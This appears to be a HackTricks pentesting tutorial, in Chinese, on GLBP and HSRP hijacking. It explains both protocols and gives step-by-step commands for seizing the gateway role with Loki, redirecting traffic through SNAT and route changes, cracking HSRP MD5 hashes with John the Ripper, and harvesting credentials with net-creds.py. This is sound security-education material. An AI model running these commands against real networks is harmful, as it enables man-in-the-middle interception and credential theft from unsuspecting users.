# GLBP & HSRP 攻击

<details>

<summary><strong>从零到英雄学习 AWS 黑客攻击，通过</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS 红队专家)</strong></a><strong>!</strong></summary>

支持 HackTricks 的其他方式：

* 如果你想在 **HackTricks** 中看到你的**公司广告**或**下载 HackTricks 的 PDF**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取 [**官方 PEASS & HackTricks 商品**](https://peass.creator-spring.com)
* 发现 [**PEASS 家族**](https://opensea.io/collection/the-peass-family)，我们独家的 [**NFTs 集合**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram 群组**](https://t.me/peass) 或在 **Twitter** 🐦 上**关注**我 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 仓库提交 PR 来分享你的黑客技巧。

</details>


## FHRP 劫持概述

### 理解 FHRP
First Hop Redundancy Protocol (FHRP) 是一套确保网络弹性的协议，通过将多个物理路由器组合成一个虚拟实体来实现。这增强了负载分配和容错能力。Cisco Systems 引入了两个值得注意的 FHRP 协议：GLBP 和 HSRP。

### GLBP 协议详情
由 Cisco 开发的 GLBP (Gateway Load Balancing Protocol) 在 TCP/IP 堆栈之上运行，使用 UDP 端口 3222 进行通信。GLBP 组内的路由器每 3 秒发送一次 "hello" 数据包。如果 10 秒内没有收到某个路由器的这些数据包，则表明它已经失效。然而，这些计时器设置是可调的。

### GLBP 操作和负载均衡
GLBP 通过使用单个虚拟 IP 和多个虚拟 MAC 地址实现了多个路由器之间的负载共享。组内的每个路由器都参与数据包的转发。GLBP 与 HSRP/VRRP 的不同之处在于它提供了真正的负载均衡，包括：

- **主机依赖：** 确保主机接收到相同的 AVF MAC 地址，保留 NAT 配置。
- **轮询：** 默认模式，AVF MAC 地址交替分配。
- **基于权重的轮询：** 根据预定义的 "权重" 指标平衡负载。

### GLBP 领域角色和术语
- **AVG (Active Virtual Gateway)：** 主路由器，向其他路由器分配 MAC 地址。
- **AVF (Active Virtual Forwarder)：** 处理网络流量的路由器。
- **GLBP 优先级：** 决定 AVG，缺省值为 100，范围从 1 到 255。
- **GLBP 权重：** 表示路由器的负载水平，可以手动调整或通过对象跟踪进行调整。
- **GLBP 虚拟 IP 地址：** 作为连接设备的默认网关。

GLBP 使用保留的组播地址 224.0.0.102 和 UDP 端口 3222 进行通信。每 3 秒发送一次 "hello" 数据包，如果 10 秒内没有收到数据包，路由器就会被标记为 "死亡"。

### GLBP 攻击机制
攻击者可以通过发送具有最高优先级值 (255) 的 GLBP 数据包成为主路由器。这可能导致 DoS 或 MITM 攻击，允许流量截取或重定向。

### 使用 Loki 执行 GLBP 攻击
[Loki](https://github.com/raizo62/loki_on_kali) 可以通过注入优先级和权重均设置为 255 的数据包来执行 GLBP 攻击。攻击前的步骤包括使用 Wireshark 等工具收集信息，如虚拟 IP 地址、认证存在与否以及路由器优先级值。

攻击步骤：
1. 切换到混杂模式并启用 IP 转发。
2. 识别目标路由器并检索其 IP。
3. 生成一个 Gratuitous ARP。
4. 注入恶意 GLBP 数据包，冒充 AVG。
5. 为攻击者的网络接口分配一个次要 IP 地址，反映 GLBP 虚拟 IP。
6. 实施 SNAT 以完全查看流量。
7. 调整路由以确保通过原始 AVG 路由器继续访问互联网。

通过遵循这些步骤，攻击者将自己定位为 "中间人"，能够截取和分析网络流量，包括未加密或敏感数据。

为了演示，这里是所需的命令片段：
```bash
# Enable promiscuous mode and IP forwarding
sudo ip link set eth0 promisc on
sudo sysctl -w net.ipv4.ip_forward=1

# Configure secondary IP and SNAT
sudo ifconfig eth0:1 10.10.100.254 netmask 255.255.255.0
sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE

# Adjust routing
sudo route del default
sudo route add -net 0.0.0.0 netmask 0.0.0.0 gw 10.10.100.100
```
监控和拦截流量可以使用 net-creds.py 或类似工具来捕获和分析通过受损网络流动的数据。

### HSRP 劫持的被动解释与命令详情

#### HSRP（热备用路由器/冗余协议）概述
HSRP 是 Cisco 专有协议，旨在为网络网关冗余设计。它允许将多个物理路由器配置为一个具有共享 IP 地址的单个逻辑单元。这个逻辑单元由负责指导流量的主路由器管理。与使用优先级和权重进行负载平衡的 GLBP 不同，HSRP 依赖单个活动路由器进行流量管理。

#### HSRP 中的角色和术语
- **HSRP 活动路由器**：作为网关的设备，管理流量流动。
- **HSRP 备用路由器**：备份路由器，如果活动路由器失败，准备接管。
- **HSRP 组**：一组协作的路由器，形成一个单一的弹性虚拟路由器。
- **HSRP MAC 地址**：在 HSRP 设置中分配给逻辑路由器的虚拟 MAC 地址。
- **HSRP 虚拟 IP 地址**：HSRP 组的虚拟 IP 地址，作为连接设备的默认网关。

#### HSRP 版本
HSRP 有两个版本，HSRPv1 和 HSRPv2，主要区别在于组容量、多播 IP 使用和虚拟 MAC 地址结构。该协议使用特定的多播 IP 地址进行服务信息交换，每 3 秒发送一次 Hello 数据包。如果在 10 秒间隔内未收到数据包，路由器被假定为不活动状态。

#### HSRP 攻击机制
HSRP 攻击涉及通过注入最大优先级值强制接管活动路由器的角色。这可能导致中间人攻击（MITM）。攻击前的重要步骤包括收集有关 HSRP 设置的数据，可以使用 Wireshark 进行流量分析来完成。

#### 绕过 HSRP 认证的步骤
1. 将包含 HSRP 数据的网络流量保存为 .pcap 文件。
```shell
tcpdump -w hsrp_traffic.pcap
```
2. 使用 hsrp2john.py 从 .pcap 文件中提取 MD5 哈希。
```shell
python2 hsrp2john.py hsrp_traffic.pcap > hsrp_hashes
```
3. 使用 John the Ripper 破解 MD5 哈希。
```shell
john --wordlist=mywordlist.txt hsrp_hashes
```

**使用 Loki 执行 HSRP 注入**

1. 启动 Loki 以识别 HSRP 广告。
2. 将网络接口设置为混杂模式并启用 IP 转发。
```shell
sudo ip link set eth0 promisc on
sudo sysctl -w net.ipv4.ip_forward=1
```
3. 使用 Loki 针对特定路由器，输入破解的 HSRP 密码，并执行必要的配置以冒充活动路由器。
4. 在获得活动路由器角色后，配置网络接口和 IP 表以拦截合法流量。
```shell
sudo ifconfig eth0:1 10.10.100.254 netmask 255.255.255.0
sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
```
5. 修改路由表，通过前活动路由器路由流量。
```shell
sudo route del default
sudo route add -net 0.0.0.0 netmask 0.0.0.0 gw 10.10.100.100
```
6. 使用 net-creds.py 或类似工具捕获从拦截流量中的凭证。
```shell
sudo python2 net-creds.py -i eth0
```

执行这些步骤使攻击者能够拦截和操纵流量，类似于 GLBP 劫持的程序。这突出了像 HSRP 这样的冗余协议的漏洞以及对强大安全措施的需求。


# 参考资料
- [https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9](https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9)

<details>

<summary><strong>从零到英雄学习 AWS 黑客攻击</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS 红队专家)</strong></a><strong>！</strong></summary>

支持 HackTricks 的其他方式：

* 如果你想在 **HackTricks** 中看到你的**公司广告**或**下载 HackTricks 的 PDF**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取 [**官方 PEASS & HackTricks 商品**](https://peass.creator-spring.com)
* 发现 [**PEASS 家族**](https://opensea.io/collection/the-peass-family)，我们独家的 [**NFT 集合**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram 群组**](https://t.me/peass) 或在 **Twitter** 🐦 上**关注**我 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 仓库提交 PR 来分享你的黑客技巧。

</details>
